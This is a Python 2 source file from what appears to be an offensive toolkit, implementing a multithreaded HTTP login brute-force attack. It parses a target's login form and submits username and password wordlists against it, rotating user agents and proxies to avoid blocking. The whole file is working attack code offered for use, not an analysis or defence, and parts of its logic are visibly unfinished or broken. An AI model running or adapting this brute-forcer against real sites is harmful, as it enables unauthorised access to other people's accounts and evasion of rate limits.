### REWRITE httpbrute
## NO oop

import mechanize, sys, threading
from core import utils, actions, tbrowser

def handle(optionURL, optionUserlist, optionPasslist, optionProxyList, optionKeyFalse, optionThreads):
	# get login form info 
	# call brute
	
	"""
	Testing result: -u, -p:
	- first task: 3 same threads
	- after: 1 thread each task (randomly, could be slow resp )
	Testing with default:
	- first task: 3 same threads
	- after: 2 same threads (likely)
	"""
	
	
	sizePasslist = actions.size_o(optionPasslist)
	proc = tbrowser.startBrowser()
	proc.addheaders = [('User-Agent', tbrowser.useragent())]

	try:
		utils.printf("Connecting to target...")
		proc.open(optionURL)
		loginInfo = tbrowser.getLoginForm(optionURL, proc)
		utils.printf("Connection success! Starting attack.")

	except Exception as err:
		utils.die("Error while parsing login form", err)

	finally:
		proc.close()
		
	workers = []

	# New testing method 
	for usrname in optionUserlist:
		co = 0
		for i in xrange(optionThreads):
			passwd = optionPasslist[co + i]
			worker = threading.Thread(
				target = brute,
				args = (optionURL, usrname, passwd, sizePasslist, optionProxyList, optionKeyFalse, loginInfo)
			)
			workers.append(worker)

		#for worker in workers:
			worker.daemon = True 
			worker.start()

		co += 1
		for worker in workers:
			worker.join()
	# end of testing

	# old method
	# try:
	# 	for i in xrange(optionThreads):
	# 		worker = threading.Thread(
	# 			target = brute,
	# 			args = (optionURL, optionUserlist, optionPasslist, sizePasslist, optionProxyList, optionKeyFalse, loginInfo)
	# 		)
	# 		workers.append(worker)
	# 
	# except Exception as err:
	# 	utils.die("Error while creating threads", err)
	# 
	# try:
	# 	for worker in workers:
	# 		worker.daemon = True
	# 		worker.start()
	# 
	# except Exception as err:
	# 	utils.die("Error while running thread", err)
	# 
	# finally:
	# 	for worker in workers:
	# 		worker.join()
	#brute(optionURL, optionUserlist, optionPasslist, sizePasslist, optionProxyList, optionKeyFalse, loginInfo)

def brute(optionURL, tryUsername, tryPassword, sizePasslist, setProxyList, setKeyFalse, loginInfo):
	############################################
	#	Old code logic:
	#		Create 1 browser object per password
	#	Current:
	#		Create 1 browser object per username
	#		Pick 1 user agent per password try
	#
	############################################

	#	Get login form field informations
	frmLoginID, frmUserfield, frmPassfield = loginInfo
	#	Get single Username in username list / file
	# for tryUsername in optionUserlist:
	# 	#	If tryUsername is file object, remove \n
	# 	tryUsername = tryUsername.replace('\n', '')
	
	#TODO improve logic struct 
	
	proc = tbrowser.startBrowser()

	idxTry = 0
		#	Get single Password, remove \n
	tryPassword = tryPassword.replace('\n', '')

	#	New test code block: add new user_agent each try
	user_agent = tbrowser.useragent()
	proc.addheaders = [('User-Agent', user_agent)]
	
	print "Debug: %s:%s" %(tryUsername, tryPassword)
	
	
	if setProxyList:
		#Set proxy connect
		proxyAddr = actions.randomFromList(setProxyList)
		#utils.printf("Debug: proxy addr %s" %(proxyAddr))
		proc.set_proxies({"http": proxyAddr})

	proc.open(optionURL)
		#	End new code block

	try:
		idxTry += 1

		#	Select login form
		proc.select_form(nr = frmLoginID)
		proc.form[frmUserfield] = tryUsername
		proc.form[frmPassfield] = tryPassword
		print "Debug: %s:%s" %(tryUsername, tryPassword)

		#	Print status bar
		utils.printp(tryUsername, idxTry, sizePasslist)

		#	Send request
		proc.submit()

		#	Reload - useful for redirect to dashboard
		proc.reload()

		#	If no login form -> success
		#	TODO improve condition to use captcha
		if not tbrowser.parseLoginForm(proc.forms()):

			#TODO edit mixed condition
			if setKeyFalse:
				if setKeyFalse not in proc.response().read():
					
					# Add creds to success list
					# If verbose: print
					
					printSuccess(tryUsername, tryPassword)

					#	Clear object and try new username
					proc.close()
			else:
				utils.printSuccess(tryUsername, tryPassword)

				#	Clear object and try new username
				proc.close()

	except mechanize.HTTPError as error:
		#	Get blocked
		utils.die("Thread has been blocked", error)

	proc.close()
	
	
def old_handle(optionURL, optionUserlist, optionPasslist, optionProxyList, optionKeyFalse, optionThreads):
	# get login form info 
	# call brute
	
	"""
	Testing result: -u, -p:
	- first task: 3 same threads
	- after: 1 thread each task (randomly, could be slow resp )
	Testing with default:
	- first task: 3 same threads
	- after: 2 same threads (likely)
	"""

	sizePasslist = actions.size_o(optionPasslist)
	proc = tbrowser.startBrowser()
	proc.addheaders = [('User-Agent', tbrowser.useragent())]

	try:
		proc.open(optionURL)
		loginInfo = tbrowser.getLoginForm(optionURL, proc)

	except Exception as err:
		utils.die("Error while parsing login form", err)

	finally:
		proc.close()
		
	workers = []

	# New testing method 
	for usrname in optionUserlist:
		for i in xrange(optionThreads):
			worker = threading.Thread(
				target = brute,
				args = (optionURL, usrname, optionPasslist, sizePasslist, optionProxyList, optionKeyFalse, loginInfo)
			)
			workers.append(worker)
			worker.daemon = True 
			worker.start()
		for worker in workers:
			worker.join()

def old_brute(optionURL, optionUserlist, optionPasslist, sizePasslist, setProxyList, setKeyFalse, loginInfo):
	############################################
	#	Old code logic:
	#		Create 1 browser object per password
	#	Current:
	#		Create 1 browser object per username
	#		Pick 1 user agent per password try
	#
	############################################

	#	Get login form field informations
	frmLoginID, frmUserfield, frmPassfield = loginInfo
	#	Get single Username in username list / file
	for tryUsername in optionUserlist:
		#	If tryUsername is file object, remove \n
		tryUsername = tryUsername.replace('\n', '')

		proc = tbrowser.startBrowser()

		idxTry = 0
		for tryPassword in optionPasslist:
			#	Get single Password, remove \n
			tryPassword = tryPassword.replace('\n', '')

			#	New test code block: add new user_agent each try
			user_agent = tbrowser.useragent()
			proc.addheaders = [('User-Agent', user_agent)]
			
			print "Debug: %s:%s" %(tryUsername, tryPassword)
			
			
			if setProxyList:
				#Set proxy connect
				proxyAddr = actions.randomFromList(setProxyList)
				#utils.printf("Debug: proxy addr %s" %(proxyAddr))
				proc.set_proxies({"http": proxyAddr})

			proc.open(optionURL)
			#	End new code block

			try:
				idxTry += 1

				#	Select login form
				proc.select_form(nr = frmLoginID)
				proc.form[frmUserfield] = tryUsername
				proc.form[frmPassfield] = tryPassword

				#	Print status bar
				utils.printp(tryUsername, idxTry, sizePasslist)

				#	Send request
				proc.submit()

				#	Reload - useful for redirect to dashboard
				proc.reload()

				#	If no login form -> success
				#	TODO improve condition to use captcha
				if not tbrowser.parseLoginForm(proc.forms()):

					#TODO edit mixed condition
					if setKeyFalse:
						if setKeyFalse not in proc.response().read():
							
							# Add creds to success list
							# If verbose: print
							
							printSuccess(tryUsername, tryPassword)

							#	Clear object and try new username
							proc.close()
							break
					else:
						utils.printSuccess(tryUsername, tryPassword)

						#	Clear object and try new username
						proc.close()
						break

			except mechanize.HTTPError as error:
				#	Get blocked
				utils.die("Thread has been blocked", error)

		proc.close()